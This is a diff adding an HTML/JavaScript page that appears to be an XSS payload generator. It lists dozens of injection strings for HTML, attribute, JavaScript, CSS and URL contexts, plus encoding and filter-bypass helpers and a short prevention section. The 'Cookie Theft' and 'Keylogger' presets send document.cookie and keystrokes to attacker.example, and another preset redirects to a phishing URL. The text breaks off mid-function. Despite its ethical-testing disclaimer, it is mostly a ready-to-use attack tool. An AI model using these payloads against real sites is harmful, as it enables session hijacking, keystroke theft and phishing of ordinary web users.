@@ -1,0 +1,496 @@
+<html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS Payload Generator Tool - System32</title>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; min-height:100vh; overflow-x:hidden; position:relative; }
+    #matrix-canvas { position:fixed; top:0; left:0; width:100%; height:100%; z-index:-1; opacity:0.1; }
+    .container{ max-width:1200px; margin:0 auto; padding:20px; position:relative; z-index:1; }
+    .terminal-header{ background:linear-gradient(145deg,#1a1a1a,#2d2d2d); border:2px solid #00ff41; border-radius:10px 10px 0 0; padding:15px 20px; display:flex; align-items:center; gap:10px; box-shadow:0 0 20px rgba(0,255,65,0.3); }
+    .terminal-dots{ display:flex; gap:8px; } .dot{ width:12px; height:12px; border-radius:50%; background:#ff6b35; box-shadow:0 0 10px rgba(255,107,53,0.5); } .dot:nth-child(2){ background:#ffeb3b; } .dot:nth-child(3){ background:#00ff41; }
+    .terminal-title{ color:#00ff41; font-size:18px; font-weight:bold; text-shadow:0 0 10px rgba(0,255,65,0.5); }
+    .terminal-body{ background:linear-gradient(145deg,#0f0f0f,#1a1a1a); border:2px solid #00ff41; border-top:none; border-radius:0 0 10px 10px; padding:30px; box-shadow:0 0 20px rgba(0,255,65,0.2); }
+    .command-prompt{ color:#00ff41; margin-bottom:20px; font-size:14px; } .prompt-symbol{ color:#ff6b35; }
+    .tool-description{ background:rgba(0,255,65,0.1); border:1px solid #00ff41; border-radius:8px; padding:20px; margin:20px 0; text-align:center; }
+    .description-title{ font-size:24px; color:#00ff41; margin-bottom:10px; text-shadow:0 0 10px rgba(0,255,65,0.5); }
+    .description-text{ color:#cccccc; line-height:1.6; }
+    .security-note{ background:linear-gradient(145deg, rgba(255,68,68,0.15), rgba(255,68,68,0.05)); border:2px solid #ff4444; border-radius:8px; padding:15px; margin:20px 0; color:#ff4444; text-align:center; box-shadow:0 0 15px rgba(255,68,68,0.2); }
+    .payload-section{ background:rgba(0,255,65,0.05); border:1px solid #00ff41; border-radius:8px; padding:25px; margin:20px 0; }
+    .section-title{ color:#ff6b35; font-size:18px; margin-bottom:15px; text-align:center; text-shadow:0 0 8px rgba(255,107,53,0.5); }
+    .payload-type-selector{ margin-bottom:20px; }
+    .payload-type-options{ display:flex; gap:15px; flex-wrap:wrap; justify-content:center; }
+    .payload-type-option{ display:flex; align-items:center; gap:5px; color:#cccccc; font-size:14px; }
+    .payload-type-option input[type="radio"]{ accent-color:#00ff41; }
+    .input-group{ margin-bottom:20px; }
+    .input-label{ display:block; color:#00ff41; margin-bottom:8px; font-size:14px; }
+    .input-field{ width:100%; background:#1a1a1a; border:2px solid #333; border-radius:5px; padding:12px; color:#00ff41; font-family:'Courier New', monospace; font-size:14px; transition:all .3s ease; }
+    .input-field:focus{ outline:none; border-color:#00ff41; box-shadow:0 0 15px rgba(0,255,65,0.3); }
+    .textarea-field{ min-height:100px; resize:vertical; }
+    .generate-button{ background:linear-gradient(145deg,#00ff41,#00cc35); border:none; border-radius:8px; padding:12px 30px; color:#000; font-family:'Courier New', monospace; font-size:16px; font-weight:bold; cursor:pointer; transition:all .3s ease; display:block; margin:20px auto; text-transform:uppercase; }
+    .generate-button:hover{ transform:translateY(-2px); box-shadow:0 0 20px rgba(0,255,65,0.5); }
+    .preset-buttons{ display:flex; gap:10px; flex-wrap:wrap; justify-content:center; margin:15px 0; }
+    .preset-btn{ background:rgba(255,107,53,0.2); border:1px solid #ff6b35; border-radius:5px; padding:8px 15px; color:#ff6b35; font-size:12px; cursor:pointer; transition:all .3s ease; font-family:'Courier New', monospace; }
+    .preset-btn:hover{ background:rgba(255,107,53,0.4); }
+    .payload-display{ background:#1a1a1a; border:2px solid #00ff41; border-radius:5px; padding:15px; margin:15px 0; font-family:'Courier New', monospace; word-break:break-all; color:#00ff41; max-height:200px; overflow-y:auto; cursor:pointer; }
+    .payload-display:hover{ background:rgba(0,255,65,0.1); box-shadow:0 0 10px rgba(0,255,65,0.2); }
+    .encoding-section{ background:rgba(255,107,53,0.1); border:1px solid #ff6b35; border-radius:8px; padding:20px; margin:20px 0; }
+    .encoding-title{ color:#ff6b35; font-size:16px; margin-bottom:15px; text-align:center; }
+    .encoding-options{ display:flex; gap:15px; flex-wrap:wrap; justify-content:center; margin-bottom:15px; }
+    .encoding-option{ display:flex; align-items:center; gap:5px; color:#cccccc; font-size:14px; }
+    .encoding-option input[type="checkbox"]{ accent-color:#ff6b35; }
+    .info-section{ background:rgba(255,107,53,0.1); border:1px solid #ff6b35; border-radius:8px; padding:20px; margin:20px 0; }
+    .info-title{ color:#ff6b35; font-size:16px; margin-bottom:10px; text-shadow:0 0 8px rgba(255,107,53,0.5); }
+    .info-text{ color:#cccccc; font-size:13px; line-height:1.5; }
+    .xss-types{ display:grid; grid-template-columns:repeat(auto-fit,minmax(250px,1fr)); gap:15px; margin:15px 0; }
+    .xss-type{ background:rgba(0,255,65,0.05); border:1px solid #333; border-radius:5px; padding:15px; text-align:center; }
+    .xss-type h4{ color:#00ff41; margin-bottom:8px; font-size:14px; }
+    .xss-type p{ font-size:12px; color:#cccccc; }
+    .back-link{ display:inline-flex; align-items:center; gap:8px; color:#ff6b35; text-decoration:none; margin-top:20px; padding:10px 15px; border:1px solid #ff6b35; border-radius:5px; transition:all .3s ease; }
+    .back-link:hover{ background:rgba(255,107,53,0.1); box-shadow:0 0 15px rgba(255,107,53,0.3); }
+
+    @media (max-width:768px){
+      .container{ padding:10px; } .terminal-body{ padding:20px; } .payload-section{ padding:15px; } .payload-type-options, .encoding-options{ flex-direction:column; align-items:center; } .preset-buttons{ flex-direction:column; align-items:center; } .xss-types{ grid-template-columns:1fr; }
+    }
+  </style>
+</head>
+<body>
+  <canvas id="matrix-canvas" width="874" height="748"></canvas>
+  <div class="container">
+    <div class="terminal-header">
+      <div class="terminal-dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+      <div class="terminal-title"><i class="fas fa-bug"></i> XSS Testing &amp; Payload Generator</div>
+    </div>
+
+    <div class="terminal-body">
+      <div class="command-prompt">
+        <span class="prompt-symbol">┌──(</span><span style="color:#ff6b35;">System32㉿xss-toolkit</span><span class="prompt-symbol">)-[</span><span style="color:#00ff41;">~/cross-site-scripting</span><span class="prompt-symbol">]</span><br>
+        <span class="prompt-symbol">└─$</span> ./xss_generator.py --context-aware --educational
+      </div>
+
+      <div class="tool-description">
+        <div class="description-title"><i class="fas fa-bug"></i> XSS Testing &amp; Payload Generator</div>
+        <div class="description-text">Generate context-aware XSS payloads for authorized security testing and educational purposes. Includes encoding utilities, bypass techniques, and comprehensive vulnerability research tools.</div>
+      </div>
+
+      <div class="security-note"><i class="fas fa-exclamation-triangle"></i> <strong>ETHICAL TESTING ONLY:</strong> This tool is designed exclusively for authorized penetration testing, bug bounty programs, and educational security research. Unauthorized testing is illegal and unethical.</div>
+
+      <div class="payload-section">
+        <div class="section-title"><i class="fas fa-code"></i> XSS Payload Generator</div>
+
+        <div class="payload-type-selector">
+          <label class="input-label">Payload Context:</label>
+          <div class="payload-type-options">
+            <div class="payload-type-option"><input type="radio" id="contextHTML" name="payloadContext" value="html" checked=""><label for="contextHTML">HTML Context</label></div>
+            <div class="payload-type-option"><input type="radio" id="contextAttribute" name="payloadContext" value="attribute"><label for="contextAttribute">Attribute Context</label></div>
+            <div class="payload-type-option"><input type="radio" id="contextJS" name="payloadContext" value="javascript"><label for="contextJS">JavaScript Context</label></div>
+            <div class="payload-type-option"><input type="radio" id="contextCSS" name="payloadContext" value="css"><label for="contextCSS">CSS Context</label></div>
+            <div class="payload-type-option"><input type="radio" id="contextURL" name="payloadContext" value="url"><label for="contextURL">URL Context</label></div>
+          </div>
+        </div>
+
+        <div class="input-group">
+          <label class="input-label">Custom Payload (optional):</label>
+          <textarea id="customPayload" class="input-field textarea-field" placeholder="Enter custom JavaScript payload or leave empty for default alert()"></textarea>
+        </div>
+
+        <div class="preset-buttons">
+          <button class="preset-btn" onclick="setAlertPreset()">Alert Box</button>
+          <button class="preset-btn" onclick="setDocumentPreset()">Document Info</button>
+          <button class="preset-btn" onclick="setCookiePreset()">Cookie Theft</button>
+          <button class="preset-btn" onclick="setRedirectPreset()">Redirect</button>
+          <button class="preset-btn" onclick="setKeystrokePreset()">Keylogger</button>
+          <button class="preset-btn" onclick="setBypassPreset()">WAF Bypass</button>
+        </div>
+
+        <button id="generatePayloadButton" class="generate-button"><i class="fas fa-code"></i> Generate XSS Payloads</button>
+
+        <div id="payloadResults" style="display:none;">
+          <div class="input-label">Generated Payloads (click to copy):</div>
+          <div id="payloadOutput"></div>
+        </div>
+      </div>
+
+      <div class="encoding-section">
+        <div class="encoding-title"><i class="fas fa-shield-alt"></i> Encoding &amp; Obfuscation</div>
+        <div class="encoding-options">
+          <div class="encoding-option"><input type="checkbox" id="encHTML" name="encoding" value="html"><label for="encHTML">HTML Entities</label></div>
+          <div class="encoding-option"><input type="checkbox" id="encURL" name="encoding" value="url"><label for="encURL">URL Encoding</label></div>
+          <div class="encoding-option"><input type="checkbox" id="encJS" name="encoding" value="javascript"><label for="encJS">JavaScript Encoding</label></div>
+          <div class="encoding-option"><input type="checkbox" id="encHex" name="encoding" value="hex"><label for="encHex">Hex Encoding</label></div>
+          <div class="encoding-option"><input type="checkbox" id="encBase64" name="encoding" value="base64"><label for="encBase64">Base64 Encoding</label></div>
+        </div>
+
+        <div class="input-group"><label class="input-label">Text to Encode:</label><textarea id="encodeInput" class="input-field textarea-field" placeholder="Enter text to encode/decode..."></textarea></div>
+
+        <div class="preset-buttons">
+          <button class="preset-btn" onclick="encodeText()">Encode</button>
+          <button class="preset-btn" onclick="decodeText()">Decode</button>
+          <button class="preset-btn" onclick="clearEncoding()">Clear</button>
+        </div>
+
+        <div id="encodingResults" style="display:none;">
+          <div class="input-label">Encoded Results:</div>
+          <div id="encodingOutput"></div>
+        </div>
+      </div>
+
+      <div class="info-section">
+        <div class="info-title"><i class="fas fa-info-circle"></i> XSS Attack Types &amp; Prevention</div>
+        <div class="info-text">
+          <strong>Cross-Site Scripting (XSS)</strong> is a web security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. Understanding XSS is crucial for both offensive and defensive security.
+          <div class="xss-types">
+            <div class="xss-type"><h4>Reflected XSS</h4><p>Malicious script is reflected off a web server, such as in an error message or search result.</p></div>
+            <div class="xss-type"><h4>Stored XSS</h4><p>Malicious script is permanently stored on target servers, such as in databases or message forums.</p></div>
+            <div class="xss-type"><h4>DOM-based XSS</h4><p>Vulnerability exists in client-side code rather than server-side code.</p></div>
+            <div class="xss-type"><h4>Blind XSS</h4><p>Similar to stored XSS but occurs in applications that don't reflect the output back to the user.</p></div>
+          </div>
+          <strong>Common XSS Contexts:</strong>
+          <br>• <strong>HTML Context:</strong> Direct injection into HTML content
+          <br>• <strong>Attribute Context:</strong> Injection into HTML attributes
+          <br>• <strong>JavaScript Context:</strong> Injection into JavaScript code
+          <br>• <strong>CSS Context:</strong> Injection into CSS stylesheets
+          <br>• <strong>URL Context:</strong> Injection into URL parameters
+          <br><br><strong>Prevention Techniques:</strong>
+          <br>• <strong>Input Validation:</strong> Validate and sanitize all user inputs
+          <br>• <strong>Output Encoding:</strong> Encode data when outputting to HTML
+          <br>• <strong>Content Security Policy (CSP):</strong> Restrict resource loading
+          <br>• <strong>HTTPOnly Cookies:</strong> Prevent JavaScript access to cookies
+          <br>• <strong>X-XSS-Protection Header:</strong> Enable browser XSS filtering
+          <br><br><strong>Testing Methodology:</strong>
+          <br>• Identify input vectors and reflection points
+          <br>• Test different contexts (HTML, attribute, JavaScript, etc.)
+          <br>• Attempt encoding bypasses and filter evasion
+          <br>• Test for stored XSS in persistent data
+          <br>• Verify impact and create proof-of-concept
+        </div>
+      </div>
+
+      <a href="/" class="back-link"><i class="fas fa-arrow-left"></i> Back to Security Tools</a>
+		<div class="footer" style="text-align:center;padding:18px;color:#7bdc9f;font-size:12px;border-top:1px solid rgba(0,255,65,.2);margin-top:12px">
+              <i class="fas fa-code"></i> XSS Payload Generator Toolr Terminal v1.0 |
+              <a href="/" target="_blank" style="color:#00ff41;text-decoration:none">System32</a>
+              <span class="love" style="color:#19ffa0">❤️</span> Made with love.
+            </div>
+    </div>
+  </div>
+
+  <!-- ===== SCRIPT: lógica, payloads, guard, encoding, sanitizado ===== -->
+  <script>
+    /* Matrix effect */
+    const canvas = document.getElementById('matrix-canvas');
+    const ctx = canvas.getContext('2d');
+    let fontSize = 10;
+    let matrix = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()*&^%+-/~{[|`]}";
+    let matrixArray = matrix.split("");
+    let columns, drops;
+    function resizeCanvas(){ canvas.width = window.innerWidth; canvas.height = window.innerHeight; fontSize = window.innerWidth < 480 ? 8 : 10; columns = Math.floor(canvas.width / fontSize); drops = []; for (let x=0;x<columns;x++){ drops[x]=Math.floor(Math.random()*canvas.height/fontSize); } }
+    window.addEventListener('resize', resizeCanvas); resizeCanvas();
+    function draw(){ ctx.fillStyle='rgba(0,0,0,0.04)'; ctx.fillRect(0,0,canvas.width,canvas.height); ctx.fillStyle='#00ff41'; ctx.font = fontSize+'px arial'; for(let i=0;i<drops.length;i++){ const text = matrixArray[Math.floor(Math.random()*matrixArray.length)]; ctx.fillText(text, i*fontSize, drops[i]*fontSize); if (drops[i]*fontSize > canvas.height && Math.random()>0.975) drops[i]=0; drops[i]++; } }
+    setInterval(draw,35);
+
+    /* ---------- Base templates ---------- */
+    const xssPayloads = {
+      html: {
+        basic: [
+          '<' + 'script>alert("XSS")' + '<' + '/script>',
+          '<img src=x onerror=alert("XSS")>',
+          '<svg onload=alert("XSS")>',
+          '<iframe src="javascript:alert(\\\'XSS\\\')">',
+          '<body onload=alert("XSS")>',
+          '<input type="image" src=x onerror=alert("XSS")>',
+          '<object data="javascript:alert(\\\'XSS\\\')">',
+          '<embed src="javascript:alert(\\\'XSS\\\')">'
+        ],
+        custom: [
+          '<' + 'script>{payload}' + '<' + '/script>',
+          '<img src=x onerror="{payload}">',
+          '<svg onload="{payload}">',
+          '<iframe src="javascript:{payload}">',
+          '<body onload="{payload}">',
+          '<input type="image" src=x onerror="{payload}">'
+        ]
+      },
+      attribute: {
+        basic: [
+          '" onmouseover="alert(\\\'XSS\\\')" x="',
+          "' onclick='alert(\"XSS\")' x='",
+          '"><' + 'script>alert("XSS")' + '<' + '/script>',
+          '\';alert("XSS");//',
+          '" onfocus="alert(\\\'XSS\\\')" autofocus x="',
+          '" onblur="alert(\\\'XSS\\\')" x="'
+        ],
+        custom: [
+          '" onmouseover="{payload}" x="',
+          "' onclick='{payload}' x='",
+          '"><' + 'script>{payload}' + '<' + '/script>',
+          '\';{payload};//',
+          '" onfocus="{payload}" autofocus x="'
+        ]
+      },
+      javascript: {
+        basic: [
+          '\';alert("XSS");//',
+          '\";alert(\\\'XSS\\\');//',
+          '<' + '/script><' + 'script>alert("XSS")' + '<' + '/script>',
+          '\\\";alert(\\\'XSS\\\');//',
+          '-alert("XSS")-',
+          ';alert("XSS");//'
+        ],
+        custom: [
+          '\';{payload};//',
+          '\";{payload};//',
+          '<' + '/script><' + 'script>{payload}' + '<' + '/script>',
+          '\\\";{payload};//',
+          '-{payload}-',
+          ';{payload};//'
+        ]
+      },
+      css: {
+        basic: [
+          '<' + '/style><' + 'script>alert("XSS")' + '<' + '/script>',
+          'expression(alert("XSS"))',
+          'url("javascript:alert(\\\'XSS\\\')")',
+          '/**/;alert("XSS");//'
+        ],
+        custom: [
+          '<' + '/style><' + 'script>{payload}' + '<' + '/script>',
+          'expression({payload})',
+          'url("javascript:{payload}")',
+          '/**/;{payload};//'
+        ]
+      },
+      url: {
+        basic: [
+          'javascript:alert("XSS")',
+          'data:text/html,' + encodeURIComponent('<' + 'script>alert("XSS")' + '<' + '/script>'),
+          'javascript:alert(String.fromCharCode(88,83,83))',
+          'vbscript:msgbox("XSS")'
+        ],
+        custom: [
+          'javascript:{payload}',
+          'data:text/html,' + encodeURIComponent('<' + 'script>{payload}' + '<' + '/script>'),
+          'javascript:{payload}'
+        ]
+      }
+    };
+
+    /* ---------- Extend coverage: más vectores por contexto ---------- */
+    (function extendCoverage(){
+      function escNoClose(s){ return String(s).replace(new RegExp('<' + '/script','gi'), '<' + '\\/' + 'script').replace(new RegExp('<' + '/style','gi'), '<' + '\\/' + 'style'); }
+      function tplNoClose(s){ return escNoClose(s); }
+
+      // HTML extras
+      xssPayloads.html.basic = xssPayloads.html.basic.concat([
+        '<video src=x onerror=alert("XSS")>',
+        '<audio src=x onerror=alert("XSS")>',
+        '<source src=x onerror=alert("XSS")>',
+        '<track src=x onerror=alert("XSS")>',
+        '<details open ontoggle=alert("XSS")>',
+        '<marquee onstart=alert("XSS")>',
+        '<svg><animate onbegin=alert("XSS") attributeName=x dur=1s></svg>',
+        '<iframe srcdoc="' + '<' + 'script>alert(\"XSS\")' + '<' + '/script>' + '">',
+        '<math href="javascript:alert(1)">CLICK</math>'
+      ].map(escNoClose));
+
+      xssPayloads.html.custom = xssPayloads.html.custom.concat([
+        '<video src=x onerror="{payload}">',
+        '<audio src=x onerror="{payload}">',
+        '<source src=x onerror="{payload}">',
+        '<track src=x onerror="{payload}">',
+        '<details open ontoggle="{payload}">',
+        '<marquee onstart="{payload}">',
+        '<svg><animate onbegin="{payload}" attributeName=x dur=1s></svg>',
+        '<iframe srcdoc="&#60;script&#62;{payload}&#60;' + '/script&#62;">',
+        '<math onclick="{payload}">CLICK</math>'
+      ].map(tplNoClose));
+
+      // Attribute extras
+      xssPayloads.attribute.basic = xssPayloads.attribute.basic.concat([
+        '" onmouseenter="alert(\\\'XSS\\\')" x="',
+        '" onmouseleave="alert(\\\'XSS\\\')" x="',
+        '" onloadstart="alert(\\\'XSS\\\')" x="',
+        '" onerror="alert(\\\'XSS\\\')" x="',
+        '" onanimationstart="alert(\\\'XSS\\\')" x="',
+        '" ontoggle="alert(\\\'XSS\\\')" x="'
+      ]);
+      xssPayloads.attribute.custom = xssPayloads.attribute.custom.concat([
+        '" onmouseenter="{payload}" x="',
+        '" onmouseleave="{payload}" x="',
+        '" onloadstart="{payload}" x="',
+        '" onerror="{payload}" x="',
+        '" onanimationstart="{payload}" x="',
+        '" ontoggle="{payload}" x="'
+      ]);
+
+      // JS extras
+      xssPayloads.javascript.basic = xssPayloads.javascript.basic.concat([
+        '<' + '/script><' + 'script>alert("XSS")' + '<' + '/script>',
+        '`;alert("XSS");//',
+        ');alert("XSS");//',
+        ']-alert("XSS")-[',
+        '};alert("XSS");//'
+      ].map(escNoClose));
+      xssPayloads.javascript.custom = xssPayloads.javascript.custom.concat([
+        '<' + '/script><' + 'script>{payload}' + '<' + '/script>',
+        '`;{payload}//',
+        ');{payload}//',
+        '};{payload}//'
+      ].map(tplNoClose));
+
+      // CSS extras
+      xssPayloads.css.basic = xssPayloads.css.basic.concat([
+        'expression(alert("XSS"))',
+        'background-image:url("javascript:alert(\\\'XSS\\\')")',
+        '@import "data:text/css,body{color:red}";/**/;alert("XSS");//'
+      ]);
+      xssPayloads.css.custom = xssPayloads.css.custom.concat([
+        'expression({payload})',
+        'background-image:url("javascript:{payload}")',
+        '@import "data:text/css,div{display:block}";/**/;{payload}//'
+      ]);
+
+      // URL extras
+      xssPayloads.url.basic = xssPayloads.url.basic.concat([
+        'data:text/html,' + encodeURIComponent('<' + 'script>alert("XSS")' + '<' + '/script>'),
+        'javascript:alert(String.fromCharCode(88,83,83))'
+      ].map(escNoClose));
+      xssPayloads.url.custom = xssPayloads.url.custom.concat([
+        'data:text/html,' + encodeURIComponent('<' + 'script>{payload}' + '<' + '/script>'),
+        'javascript:{payload}'
+      ].map(tplNoClose));
+    })();
+
+    /* ---------- Presets (UI actions) ---------- */
+    const customPayload = document.getElementById('customPayload');
+    function setAlertPreset(){ customPayload.value = 'alert(\"XSS Test - \" + document.domain)'; }
+    function setDocumentPreset(){ customPayload.value = 'alert(\"Domain: \" + document.domain + \"\\nCookies: \" + document.cookie + \"\\nURL: \" + location.href)'; }
+    function setCookiePreset(){ customPayload.value = 'fetch(\"https://attacker.example/steal?c=\" + encodeURIComponent(document.cookie))'; }
+    function setRedirectPreset(){ customPayload.value = 'location.href=\"https://attacker.example/phishing\"'; }
+    function setKeystrokePreset(){ customPayload.value = 'document.onkeypress=function(e){fetch(\"https://attacker.example/keylog?k=\"+e.key)}'; }
+    function setBypassPreset(){ customPayload.value = 'window[\"ale\"+\"rt\"](\"XSS\")'; }
+
+    /* ---------- One-shot guard: ejecutar solo una vez por carga ---------- */
+    function oneShot(code){
+      // devuelve una cadena que envuelve el código en un IIFE con guard en window.__xss_once__
+      return '(function(w){try{if(w.__xss_once__)return;w.__xss_once__=1;' + code + '}catch(e){}})(window)';
+    }
+
+    /* Reemplazar usages típicos de alert("XSS") / javascript:alert(...) / expression(alert(...)) por guarded */
+    function applyGuardToTemplate(tmpl, guarded){
+      if (typeof tmpl !== 'string') return tmpl;
+      // construir RegExp dinámicamente (evitar escribir '</script' literal)
+      const rx1 = new RegExp('javascript:\\\\s*alert\\\\((?:\\\\\\\\?[\\"\\\']?)XSS(?:\\\\\\\\?[\\"\\\']?)\\\\)','gi');
+      // la anterior regexp está complicada por escape; usamos reemplazos simples por coincidencia textual más robusta:
+      let out = tmpl;
+      // reemplazar alert("XSS") simples (no regex que contenga '</script')
+      out = out.replace(/alert\((?:\\?["']?)XSS(?:\\?["']?)\)/gi, guarded);
+      // javascript:alert(...) en forma simple
+      out = out.replace(/javascript:\s*alert\((?:\\?["']?)XSS(?:\\?["']?)\)/gi, 'javascript:' + guarded);
+      // expression(alert(...))
+      out = out.replace(/expression\(\s*alert\((?:\\?["']?)XSS(?:\\?["']?)\)\s*\)/gi, 'expression(' + guarded + ')');
+      return out;
+    }
+
+    /* ---------- Generate payloads (UI listener) ---------- */
+    document.getElementById('generatePayloadButton').addEventListener('click', function(){
+      const context = document.querySelector('input[name="payloadContext"]:checked').value;
+      const userPayloadValue = document.getElementById('customPayload').value.trim();
+      const payloadOutput = document.getElementById('payloadOutput');
+      payloadOutput.innerHTML = '';
+
+      const baseCode = userPayloadValue || 'alert(\"XSS\")';
+      const guarded = oneShot(baseCode);
+
+      let payloadsToUse = [];
+      if (userPayloadValue){
+        payloadsToUse = (xssPayloads[context].custom || []).map(t => t.replace('{payload}', guarded));
+      } else {
+        payloadsToUse = (xssPayloads[context].basic || []).map(t => applyGuardToTemplate(t, guarded));
+      }
+
+      // Render clickable results (click-copy)
+      payloadsToUse.forEach(payload => {
+        const payloadDiv = document.createElement('div');
+        payloadDiv.className = 'payload-display';
+        payloadDiv.textContent = payload;
+        payloadDiv.onclick = function(){
+          navigator.clipboard.writeText(payload).then(()=>{
+            const orig = this.style.background; this.style.background = 'rgba(0,255,65,0.3)';
+            setTimeout(()=> this.style.background = orig, 300);
+          }).catch(()=>{
+            const ta = document.createElement('textarea'); ta.value = payload; document.body.appendChild(ta); ta.select();
+            try{ document.execCommand('copy'); }catch(e){}
+            document.body.removeChild(ta);
+          });
+        };
+        payloadOutput.appendChild(payloadDiv);
+      });
+
+      document.getElementById('payloadResults').style.display = 'block';
+    });
+
+    /* ---------- Encoding helpers ---------- */
+    function htmlEncode(str){ if (str==null) return ''; return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#x27;').replace(/\//g,'&#x2F;'); }
+    function htmlDecode(str){ if (str==null) return ''; const txt=document.createElement('textarea'); txt.innerHTML=str; return txt.value; }
+    function urlEncode(str){ try{return encodeURIComponent(str);}catch(e){return str;} }
+    function urlDecode(str){ try{return decodeURIComponent(str);}catch(e){ try{return decodeURIComponent(str.replace(/\+/g,' ')); }catch(e2){ return str; } } }
+    function jsEncode(str){ if (str==null) return ''; let out=''; for(let i=0;i<str.length;i++){ const c=str.charCodeAt(i); if(c===10) out+='\\n'; else if(c===13) out+='\\r'; else if(c===9) out+='\\t'; else if(c===92) out+='\\\\'; else if(c===39) out+="\\'"; else if(c===34) out+='\\"'; else if(c>=32 && c<=126) out+=String.fromCharCode(c); else if(c<=255) out+='\\x'+c.toString(16).padStart(2,'0'); else out+='\\u'+c.toString(16).padStart(4,'0'); } return out; }
+    function jsDecode(str){ if (str==null) return ''; try{ let s=str.replace(/\\n/g,'\n').replace(/\\r/g,'\r').replace(/\\t/g,'\t').replace(/\\\\/g,'\\').replace(/\\"/g,'"').replace(/\\'/g,"'"); s=s.replace(/\\x([0-9a-fA-F]{2})/g,(_,h)=>String.fromCharCode(parseInt(h,16))); s=s.replace(/\\u([0-9a-fA-F]{4})/g,(_,h)=>String.fromCharCode(parseInt(h,16))); return s; }catch(e){ return str; } }
+    function base64Encode(str){ if (str==null) return ''; try{ const bytes=new TextEncoder().encode(str); let bin=''; bytes.forEach(b=>bin+=String.fromCharCode(b)); return btoa(bin); }catch(e){ try{ return btoa(unescape(encodeURIComponent(str))); }catch(e2){ return str; } } }
+    function base64Decode(str){ if (str==null) return ''; try{ const bin=atob(str), bytes=new Uint8Array(bin.length); for(let i=0;i<bin.length;i++) bytes[i]=bin.charCodeAt(i); return new TextDecoder().decode(bytes); }catch(e){ try{ return decodeURIComponent(escape(atob(str))); }catch(e2){ return str; } } }
+    function hexEncode(str){ if (str==null) return ''; const bytes=new TextEncoder().encode(str); return Array.from(bytes).map(b=>b.toString(16).padStart(2,'0')).join(''); }
+    function hexDecode(hex){ if (hex==null) return ''; const cleaned=hex.replace(/[^0-9a-fA-F]/g,''); if (cleaned.length%2!==0) return hex; const bytes=new Uint8Array(cleaned.length/2); for(let i=0;i<cleaned.length;i+=2) bytes[i/2]=parseInt(cleaned.substr(i,2),16); return new TextDecoder().decode(bytes); }
+
+    /* UI helpers for encoding output */
+    function createResultBlock(label,value){
+      const wrapper=document.createElement('div'); wrapper.style.marginBottom='10px';
+      const title=document.createElement('div'); title.textContent=label; title.style.color='#ff6b35'; title.style.fontSize='13px'; title.style.marginBottom='6px';
+      const block=document.createElement('div'); block.className='payload-display'; block.textContent=value; block.style.whiteSpace='pre-wrap';
+      block.onclick=function(){ navigator.clipboard.writeText(value).then(()=>{ const o=this.style.background; this.style.background='rgba(0,255,65,0.3)'; setTimeout(()=>this.style.background=o,300); }).catch(()=>{ const ta=document.createElement('textarea'); ta.value=value; document.body.appendChild(ta); ta.select(); try{ document.execCommand('copy'); }catch(e){} document.body.removeChild(ta); }); };
+      wrapper.appendChild(title); wrapper.appendChild(block); return wrapper;
+    }
+
+    function encodeText(){ const input=document.getElementById('encodeInput').value; if(!input) return; const encHTML=encHTMLCb.checked, encURL=encURLCb.checked, encJS=encJSCb.checked, encHex=encHexCb.checked, encBase64=encB64Cb.checked; const output=document.getElementById('encodingOutput'); output.innerHTML=''; if(encHTML) output.appendChild(createResultBlock('HTML Entities', htmlEncode(input))); if(encURL) output.appendChild(createResultBlock('URL Encoded', urlEncode(input))); if(encJS) output.appendChild(createResultBlock('JavaScript Escaped', jsEncode(input))); if(encHex) output.appendChild(createResultBlock('Hex (UTF-8)', hexEncode(input))); if(encBase64) output.appendChild(createResultBlock('Base64', base64Encode(input))); if(!encHTML && !encURL && !encJS && !encHex && !encBase64){ output.appendChild(createResultBlock('Base64 (default)', base64Encode(input))); output.appendChild(createResultBlock('Hex (default)', hexEncode(input))); } document.getElementById('encodingResults').style.display='block'; }
+
+    function decodeText(){ const input=document.getElementById('encodeInput').value; if(!input) return; const encHTML=encHTMLCb.checked, encURL=encURLCb.checked, encJS=encJSCb.checked, encHex=encHexCb.checked, encBase64=encB64Cb.checked; const output=document.getElementById('encodingOutput'); output.innerHTML=''; if(encHTML) output.appendChild(createResultBlock('HTML Decode (best-effort)', htmlDecode(input))); if(encURL) output.appendChild(createResultBlock('URL Decode (best-effort)', urlDecode(input))); if(encJS) output.appendChild(createResultBlock('JavaScript Unescape (best-effort)', jsDecode(input))); if(encHex) output.appendChild(createResultBlock('Hex Decode (UTF-8) (best-effort)', hexDecode(input))); if(encBase64) output.appendChild(createResultBlock('Base64 Decode (best-effort)', base64Decode(input))); if(!encHTML && !encURL && !encJS && !encHex && !encBase64){ try{ output.appendChild(createResultBlock('Auto: Base64 Decode', base64Decode(input))); }catch(e){} try{ output.appendChild(createResultBlock('Auto: Hex Decode', hexDecode(input))); }catch(e){} output.appendChild(createResultBlock('Auto: URL Decode', urlDecode(input))); output.appendChild(createResultBlock('Auto: HTML Decode', htmlDecode(input))); output.appendChild(createResultBlock('Auto: JS Unescape', jsDecode(input))); } document.getElementById('encodingResults').style.display='block'; }
+
+    function clearEncoding(){ document.getElementById('encodeInput').value=''; document.getElementById('encodingOutput').innerHTML=''; document.getElementById('encodingResults').style.display='none'; encHTMLCb.checked=encURLCb.checked=encJSCb.checked=encHexCb.checked=encB64Cb.checked=false; }
+
+    /* Cache checkboxes/elements */
+    const encHTMLCb = document.getElementById('encHTML');
+    const encURLCb  = document.getElementById('encURL');
+    const encJSCb   = document.getElementById('encJS');
+    const encHexCb  = document.getElementById('encHex');
+    const encB64Cb  = document.getElementById('encBase64');
+
+    /* ---------- Hot sanitize---------- */
+    (function sanitizeTemplates(){
+      const tags = ['script','style'];
+      function hardEscape(str){
+        if(typeof str !== 'string') return str;
+        let out = str;
+        for(const t of tags){
+          const pat = new RegExp('<' + '/' + t, 'gi'); 
+          out = out.replace(pat, '<' + '\\/' + t);
+        }
+        return out;
+      }
+      function walk(v){
